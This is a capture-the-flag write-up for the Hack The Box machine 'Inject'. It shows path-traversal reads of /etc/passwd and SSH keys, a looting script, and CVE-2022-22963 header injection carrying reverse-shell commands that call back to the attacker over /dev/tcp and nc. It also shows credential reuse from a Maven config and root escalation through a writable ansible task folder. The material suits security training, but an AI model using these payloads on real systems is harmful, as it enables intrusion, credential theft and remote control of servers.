![inject.png](inject.png)

# Inject

## Enum

```bash
nmap -sC -sV 10.10.11.204 -oN scans/nmap.initial
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-12 18:09 GMT
Nmap scan report for 10.10.11.204
Host is up (0.032s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 caf10c515a596277f0a80c5c7c8ddaf8 (RSA)
|   256 d51c81c97b076b1cc1b429254b52219f (ECDSA)
|_  256 db1d8ceb9472b0d3ed44b96c93a7f91d (ED25519)
8080/tcp open  nagios-nsca Nagios NSCA
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.29 seconds
```

```bash
dirsearch -r -u http://10.10.11.204:8080

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/blnkn/.dirsearch/reports/10.10.11.204-8080/_23-03-12_18-17-42.txt

Error Log: /home/blnkn/.dirsearch/logs/errors-23-03-12_18-17-42.log

Target: http://10.10.11.204:8080/

[18:17:42] Starting:
[18:17:49] 400 -  435B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
[18:17:50] 400 -  435B  - /a%5c.aspx
[18:18:02] 200 -    5KB - /blogs
[18:18:08] 500 -  106B  - /error
[18:18:08] 500 -  106B  - /error/
[18:18:22] 200 -    6KB - /register
[18:18:27] 200 -    2KB - /upload
[18:18:27] 200 -    2KB - /upload/     (Added to queue)
[18:18:31] Starting: upload/
[18:18:44] 400 -  435B  - /upload/\..\..\..\..\..\..\..\..\..\etc\passwd
[18:18:45] 400 -  435B  - /upload/a%5c.aspx

Task Completed
```

```
ffuf -c \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -u "http://10.10.11.204:8080/FUZZ" \
  -mc all \
  -fc 404

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.204:8080/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response status: 404
________________________________________________

[Status: 200, Size: 5654, Words: 1053, Lines: 104, Duration: 104ms]
    * FUZZ: register

[Status: 200, Size: 1857, Words: 513, Lines: 54, Duration: 46ms]
    * FUZZ: upload

[Status: 500, Size: 106, Words: 3, Lines: 1, Duration: 411ms]
    * FUZZ: error

[Status: 200, Size: 5371, Words: 1861, Lines: 113, Duration: 46ms]
    * FUZZ: blogs

[Status: 500, Size: 712, Words: 27, Lines: 1, Duration: 145ms]
    * FUZZ: environment

[Status: 200, Size: 6657, Words: 1785, Lines: 166, Duration: 109ms]
    * FUZZ:

[Status: 400, Size: 435, Words: 32, Lines: 1, Duration: 36ms]
    * FUZZ: [

[Status: 400, Size: 435, Words: 32, Lines: 1, Duration: 33ms]
    * FUZZ: plain]

[Status: 400, Size: 435, Words: 32, Lines: 1, Duration: 38ms]
    * FUZZ: ]

[Status: 400, Size: 435, Words: 32, Lines: 1, Duration: 32ms]
    * FUZZ: quote]

[Status: 400, Size: 435, Words: 32, Lines: 1, Duration: 46ms]
    * FUZZ: extension]

[Status: 400, Size: 435, Words: 32, Lines: 1, Duration: 37ms]
    * FUZZ: [0-9]

:: Progress: [30000/30000] :: Job [1/1] :: 232 req/sec :: Duration: [0:02:53] :: Errors: 2 ::
```

People that posted on the blog
```
admin
Brandon Auger
```

After uploading things the upload page we get this: 
```
10.10.11.204:8080/show_image?img=hamster.png
```


```bash
curl -i 'http://10.10.11.204:8080/show_image?img=hamster.png;or%201=1%20--%20-'
HTTP/1.1 500
Content-Type: application/json
Transfer-Encoding: chunked
Date: Sun, 12 Mar 2023 18:45:58 GMT
Connection: close

{
  "timestamp":"2023-03-12T18:45:59.095+00:00",
  "status":500,
  "error":"Internal Server Error",
  "message":"URL [file:/var/www/WebApp/src/main/uploads/hamster.png;or%201=1%20--%20-] cannot be resolved in the file system for checking its content length",
  "path":"/show_image"
}
```

huh...
```bash
curl -i 'http://10.10.11.204:8080/show_image?img=../../../../../../../../../etc/passwd'
HTTP/1.1 200
Accept-Ranges: bytes
Content-Type: image/jpeg
Content-Length: 1986
Date: Sun, 12 Mar 2023 18:51:55 GMT

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
frank:x:1000:1000:frank:/home/frank:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
phil:x:1001:1001::/home/phil:/bin/bash
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_laurel:x:997:996::/var/log/laurel:/bin/false
```

Well that was easy
```bash
grep sh$ passwd
root:x:0:0:root:/root:/bin/bash
frank:x:1000:1000:frank:/home/frank:/bin/bash
phil:x:1001:1001::/home/phil:/bin/bash
```

```bash
curl -I 'http://10.10.11.204:8080/show_image?img=../../../../../../../../../home/frank/.ssh/id_rsa'
HTTP/1.1 200
Accept-Ranges: bytes
Content-Type: image/jpeg
Content-Length: 2602
Date: Sun, 12 Mar 2023 18:54:52 GMT
```
```bash
curl -I 'http://10.10.11.204:8080/show_image?img=../../../../../../../../../home/phil/.ssh/id_rsa'
HTTP/1.1 500
Content-Type: application/json
Transfer-Encoding: chunked
Date: Sun, 12 Mar 2023 18:56:03 GMT
Connection: close
```

```bash
nmap -p 22 --script ssh-auth-methods 10.10.11.204
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-12 18:49 GMT
Nmap scan report for 10.10.11.204
Host is up (0.033s latency).

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-auth-methods:
|   Supported authentication methods:
|     publickey
|_    password
```

We can extract a private key for frank, but it's not valid.
```bash
ssh -i frank_priv -o PubkeyAuthentication=yes -o PreferredAuthentications=publickey frank@10.10.11.204
frank@10.10.11.204: Permission denied (publickey,password).
ssh -i frank_priv -o PubkeyAuthentication=yes -o PreferredAuthentications=publickey phil@10.10.11.204
phil@10.10.11.204: Permission denied (publickey,password).
ssh -i frank_priv -o PubkeyAuthentication=yes -o PreferredAuthentications=publickey root@10.10.11.204
root@10.10.11.204: Permission denied (publickey,password).
```

The nginx virtual host config didn't give us anyting else, root is at `root /var/www/html;`
```
curl 'http://10.10.11.204:8080/show_image?img=../../../../../../../../..//etc/nginx/sites-available/default' -O
```
which does not correspond whith what we know the upload page runs on `/var/www/WebApp/src/main/uploads/hamster.png`  

Let's try to automate the process a little bit:
```python
import requests
from simple_chalk import green, red

URL = "http://10.10.11.204:8080/show_image?img=../../../../../../../../../"


def get_file(path):
    try:
        res = requests.get(URL + path, timeout=1)
    except (requests.exceptions.ReadTimeout,requests.exceptions.ConnectionError) as e:
        print(f"{red(e.__repr__)} - {path}")
        return

    if not str(res.status_code).startswith("2"):
        print(f"{red(res.status_code)} - {path}")
        return

    print(f"{green(res.status_code)} - {path}")
    file = path.split("/")[-1]
    local_path = "../loot/" + file
    with open(local_path, "w") as f:
        f.write(res.text)


if __name__ == "__main__":

    with open("/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt", "r") as f:
        seclist = f.readlines()

    for path in seclist:
        get_file(path.rstrip())

```

The hostname is just inject
```bash
cat hosts
127.0.0.1 localhost inject
127.0.1.1 inject

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Frank's public and private keys don't correspond
```bash
ssh-keygen -lf frank-pub
3072 SHA256:UCnBLc09TLqtdkBQHvowTU7dCOSs8xe0Nz8QB5Rkba8 frank@inject (RSA)
ssh-keygen -lf frank-priv
3072 SHA256:Bfekjq/lIl0rWrCsmTt4c4Yo+TtaLwyHOn82KWwUtXQ frank@inject (RSA)
```

If I trigger a 404 on purpose, the error looks like it could be tomcat:
![fourohfour.png](fourohfour.png)  

Let's see what hacktricks suggests for tomcat pentesting
[hacktricks - tomcat](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat)  

I tried a few tomcat related wordlists on the webroot that we know, without any success, so I tried to spinup some tomcat server on a docker container to get a better understanding of the expected file structure

[GitHub - tomcat tutorial](https://github.com/softwareyoga/docker-tomcat-tutorial.git)  

```bash
git clone https://github.com/softwareyoga/docker-tomcat-tutorial.git
docker build -t tomcat-test .
docker run -d -p 80:8080 tomcat-test 
docker exec -it pedantic_easley /bin/bash
```
```bash
bash-4.4# pwd
/usr/local/tomcat/webapps/sample
bash-4.4# tree .
.
├── META-INF
│   ├── MANIFEST.MF
│   └── war-tracker
├── WEB-INF
│   ├── classes
│   │   └── mypackage
│   │       └── Hello.class
│   ├── lib
│   └── web.xml
├── hello.jsp
├── images
│   └── tomcat.gif
└── index.html

6 directories, 7 files
```
/var/www/WebApp/src/main/uploads/hamster.png

Found the pom.xml at `/var/www/Webapp`
```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
        <modelVersion>4.0.0</modelVersion>
        <parent>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-starter-parent</artifactId>
                <version>2.6.5</version>
                <relativePath/> <!-- lookup parent from repository -->
        </parent>
        <groupId>com.example</groupId>
        <artifactId>WebApp</artifactId>
        <version>0.0.1-SNAPSHOT</version>
        <name>WebApp</name>
        <description>Demo project for Spring Boot</description>
SNIP
         <dependency>
                        <groupId>org.springframework.cloud</groupId>
                        <artifactId>spring-cloud-function-web</artifactId>
                        <version>3.2.2</version>
         </dependency>

SNIP
```

One of the dependencies is spring cloud 3.2.2 and has an RCE vuln:  
[CVE-2022-22963](https://spring.io/security/cve-2022-22963)  
[POC](https://github.com/me2nuk/CVE-2022-22963)  

```
git clone https://github.com/me2nuk/CVE-2022-22963.git
docker pull me2nuk/cves:2022-22963
docker run -it -p 8080:8080 --name=vuln me2nuk/cves:2022-22963

  .   ____          _            __ _ _
 /\\ / ___'_ __ _ _(_)_ __  __ _ \ \ \ \
( ( )\___ | '_ | '_| | '_ \/ _` | \ \ \ \
 \\/  ___)| |_)| | | | | || (_| |  ) ) ) )
  '  |____| .__|_| |_|_| |_\__, | / / / /
 =========|_|==============|___/=/_/_/_/
 :: Spring Boot ::               (v2.4.13)

2023-03-12 22:58:23.346  INFO 8 --- [           main] com.example.SampleApplication            : Starting SampleApplication v2.0.0.RELEASE using Java 11.0.14.1 on 7e192f55c2e6 with PID 8 (/home/rce/spring-cloud-function-3.1.6/spring-cloud-function-samples/function-sample-pojo/target/function-sample-pojo-2.0.0.RELEASE.jar started by root in /home/rce/spring-cloud-function-3.1.6/spring-cloud-function-samples/function-sample-pojo)
2023-03-12 22:58:23.351  INFO 8 --- [           main] com.example.SampleApplication            : No active profile set, falling back to default profiles: default
kj2023-03-12 22:58:25.451  INFO 8 --- [           main] o.s.c.f.web.flux.FunctionHandlerMapping  : FunctionCatalog: org.springframework.cloud.function.context.catalog.BeanFactoryAwareFunctionRegistry@5e2a6991
2023-03-12 22:58:26.019  INFO 8 --- [           main] o.s.b.web.embedded.netty.NettyWebServer  : Netty started on port 8080
2023-03-12 22:58:26.044  INFO 8 --- [           main] com.example.SampleApplication            : Started SampleApplication in 3.649 seconds (JVM running for 11.741)
```
```bash
curl -X POST  http://0.0.0.0:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("touch /tmp/pwned")' --data-raw 'data' -v
```
```bash
docker exec -it --user=root vuln ls /tmp
hsperfdata_root  pwned
```

The poc works fine on the docker image, lets try to ping ourselves back from the box
```bash
curl -X POST \
  http://10.10.11.204:8080/functionRouter \
  --data-raw 'data' \
  -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("ping -c1 10.10.14.182")'
```
```json
{"timestamp":"2023-03-12T23:03:53.222+00:00","status":500,"error":"Internal Server Error","message":"EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String","path":"/functionRouter"}
```

Works fine
```bash
sudo tcpdump -i tun0 -v icmp
tcpdump: listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
22:53:31.188558 IP (tos 0x0, ttl 63, id 2456, offset 0, flags [DF], proto ICMP (1), length 84)
    10.10.11.204 > 10.10.14.182: ICMP echo request, id 5, seq 1, length 64
22:53:31.188582 IP (tos 0x0, ttl 64, id 53938, offset 0, flags [none], proto ICMP (1), length 84)
    10.10.14.182 > 10.10.11.204: ICMP echo reply, id 5, seq 1, length 64
```

Let's try to get a reverse shels now
```bash
curl -X POST \
  http://10.10.11.204:8080/functionRouter \
  --data-raw 'data' \
  -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("sh -i >& /dev/tcp/10.10.14.182/4242 0>&1")'
```
Failed

```bash
curl -X POST \
  http://10.10.11.204:8080/functionRouter \
  --data-raw 'data' \
  -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.182 4242 >/tmp/f")'
```
Failed

This works and we got a shell as frank
```bash
curl -X POST \
  http://10.10.11.204:8080/functionRouter \
  --data-raw 'data' \
  -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/10.10.14.182/4242 0>&1")'
```

Frank does not have the user flag, but we can drop a pubkey in `authorized_keys` and get a better shell for more enumeration

Once we ssh to phil's shell, we can see that /bin/bash is already suid. Left by another HTB user.  
We're here to learn so, I'm using the suid shell to login as root, and remove the suid from /bin/bash. 
Finally I log out and back in with the proper shell.  
```bash
bash-5.0# /bin/bash -p
bash-5.0# chmod -s /bin/bash
bash-5.0# exit
```

Starting pspy64 there's an ansible job that triggers every 2 min, that's probably our golden ticket as it globs every file in the task folder, and it runs as root.
```
2023/03/13 18:44:01 CMD: UID=0    PID=77819  | /bin/sh -c /usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml
```

`root` and the `staff` group has access to write there
```bash
frank@inject:~$ ls -la /opt/automation/tasks
total 12
drwxrwxr-x 2 root staff 4096 Mar 13 18:52 .
drwxr-xr-x 3 root root  4096 Oct 20 04:23 ..
-rw-r--r-- 1 root root   150 Mar 13 18:52 playbook_1.yml
```

We don't have staff access, but phil does, so we need to gain access to phil 
```bash
frank@inject:~$ id
uid=1000(frank) gid=1000(frank) groups=1000(frank)
frank@inject:~$ id phil
uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)
```

The password for phil is in the maven settings file in frank's directory:  
```bash
frank@inject:~/.m2$ pwd
/home/frank/.m2
frank@inject:~/.m2$ cat settings.xml
<?xml version="1.0" encoding="UTF-8"?>
<settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <servers>
    <server>
      <id>Inject</id>
      <username>phil</username>
      <password>DocPhillovestoInject123</password>
      <privateKey>${user.home}/.ssh/id_dsa</privateKey>
      <filePermissions>660</filePermissions>
      <directoryPermissions>660</directoryPermissions>
      <configuration></configuration>
    </server>
  </servers>
</settings>
```

Now that we're phil we should be able to write there
```bash
frank@inject:~$ su - phil
Password:
phil@inject:~$ id
uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)
```

And at this stage it's just a matter of writing a playbook that gives us a shell
```bash
phil@inject:/opt/automation/tasks$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
phil@inject:/opt/automation/tasks$ ls -la
total 16
drwxrwxr-x 2 root staff 4096 Mar 13 19:04 .
drwxr-xr-x 3 root root  4096 Oct 20 04:23 ..
-rw-r--r-- 1 root root   150 Mar 13 19:04 playbook_1.yml
-rw-rw-r-- 1 phil phil   134 Mar 13 19:04 playbook_2.yml
phil@inject:/opt/automation/tasks$ vim playbook_2.yml
phil@inject:/opt/automation/tasks$ cat playbook_2.yml
- hosts: localhost
  tasks:
  - name: powny
    ansible.builtin.command:
      argv:
        - chmod
        - +s
        - /bin/bash
```

Wait 2 minutes for the job to run, and here we go:
```bash
phil@inject:/opt/automation/tasks$ ls -la
total 12
drwxrwxr-x 2 root staff 4096 Mar 13 19:06 .
drwxr-xr-x 3 root root  4096 Oct 20 04:23 ..
-rw-r--r-- 1 root root   150 Mar 13 19:06 playbook_1.yml
phil@inject:/opt/automation/tasks$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

Just drop suid for the next guy, and onto the next box
```bash
phil@inject:/opt/automation/tasks$ /bin/bash -p
bash-5.0# chmod -s /bin/bash
bash-5.0# ls -la /bin/bash
-rwxr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```
